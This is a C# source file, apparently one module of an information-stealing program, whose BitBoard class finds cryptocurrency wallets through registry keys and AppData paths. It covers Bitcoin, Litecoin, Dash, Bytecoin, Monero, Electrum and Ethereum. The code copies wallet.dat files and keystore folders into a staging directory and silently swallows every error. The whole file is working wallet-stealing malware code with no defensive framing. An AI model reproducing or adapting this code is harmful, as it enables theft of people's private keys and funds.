namespace PEngine.Engine.Cryptocurrencies
{
    using Microsoft.Win32;
    using PEngine.Helpers;
    using PEngine.Main;
    using System;
    using System.IO;

    public class BitBoard
    {
        private static void CopyFiles(string dir, string path)
        {
            if (File.Exists(path))
            {
                CombineEx.CreateDir(GlobalPath.CryptoDir);
                string fd = CombineEx.CombinationEx(GlobalPath.CryptoDir, dir);
                CombineEx.CreateDir(fd);
                try
                {
                    int size = 0;
                    if (!(new FileInfo(path).Length == size))
                    {
                        CombineEx.FileCopy(path, CombineEx.CombinationEx(fd, Path.GetFileName(path)), true);
                    }
                }
                catch { }
            }
        }
        private static void MassEnumerate(string to, string from, string pattern)
        {
            try
            {
                foreach (string files in Directory.EnumerateFiles(from, pattern, SearchOption.AllDirectories))
                {
                    if (!File.Exists(files))
                    {
                        continue;
                    }
                    else
                    {
                        CopyFiles(to, files);
                    }
                }
            }
            catch (IOException) { }
            catch (UnauthorizedAccessException) { }
            catch (ArgumentException) { }
        }

        public static void GetWallet()
        {
            #region Get Bitcoin

            using (var Bit = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
            {
                using (RegistryKey Key = Bit.OpenSubKey(BitcoinQT, Environment.Is64BitOperatingSystem ? true : false))
                {
                    using (RegistryKey Key2 = Bit.OpenSubKey(BitcointQT_x64, Environment.Is64BitOperatingSystem ? true : false))
                    {
                        CopyFiles("Bitcoin", CombineEx.CombinationEx(Key?.GetValue("strDataDir")?.ToString(), "wallet.dat") ?? Path.Combine(Key2?.GetValue("Path")?.ToString(), "Space", "wallet.dat"));
                    }
                }
            }

            #endregion

            #region Get Litecoin

            using (var Lite = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
            {
                using (RegistryKey Key = Lite.OpenSubKey(LitecoinQt, Environment.Is64BitOperatingSystem ? true : false))
                {
                    CopyFiles("Litecoin", CombineEx.CombinationEx(Key?.GetValue("strDataDir")?.ToString(), "wallet.dat"));
                }
            }

            #endregion

            #region Get Dashcoin

            using (var Dash = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
            {
                using (RegistryKey Key = Dash.OpenSubKey(DashcoinQt, Environment.Is64BitOperatingSystem ? true : false))
                {
                    CopyFiles("Dashcoin", CombineEx.CombinationEx(Key?.GetValue("strDataDir")?.ToString(), "wallet.dat"));
                }
            }

            #endregion

            #region Get Bytecoin

            using (var Byte = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
            {
                using (RegistryKey Key = Byte.OpenSubKey(Bytecoint, Environment.Is64BitOperatingSystem ? true : false))
                {
                    CopyFiles("Bytecoin", CombineEx.CombinationEx(Key?.GetValue("_2E72A52970B140DDB9F00AE0E5908B94")?.ToString(), "wallet.dat"));
                }
            }

            #endregion

            #region Get Monero

            using (var Monero = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
            {
                using (RegistryKey Key = Monero.OpenSubKey(Monerocoin, Environment.Is64BitOperatingSystem ? true : false))
                {
                    try
                    {
                        string kk = Key?.GetValue("wallet_path")?.ToString().Replace("/", @"\");
                        string reslts = kk.Substring(0, kk.LastIndexOf("\\"));
                        MassEnumerate("Monero", reslts.Substring(0, reslts.LastIndexOf("\\")), "*.*");
                    }
                    catch { }
                }
            }

            #endregion

            #region Get Electrum

            MassEnumerate("Electrum", CombineEx.CombinationEx(GlobalPath.AppData, @"Electrum\wallets"), "*.*");

            #endregion

            #region Get Ethereum

            MassEnumerate("Ethereum", CombineEx.CombinationEx(GlobalPath.AppData, @"Ethereum\keystore"), "*.*");

            #endregion

        }

        #region Variables Path

        private static readonly string BitcoinQT = @"Software\Bitcoin\Bitcoin-Qt";
        private static readonly string BitcointQT_x64 = @"Software\Bitcoin Core (64-bit)";
        private static readonly string LitecoinQt = @"Software\Litecoin\Litecoin-Qt";
        private static readonly string DashcoinQt = @"Software\Dash\Dash-Qt";
        private static readonly string Bytecoint = @"Software\Bytecoin Developers\Bytecoin\{BB770F1D-DC20-AD6C-30F3-1271CA1089E1}";
        private static readonly string Monerocoin = @"Software\monero-project\monero-core";

        #endregion
    }
}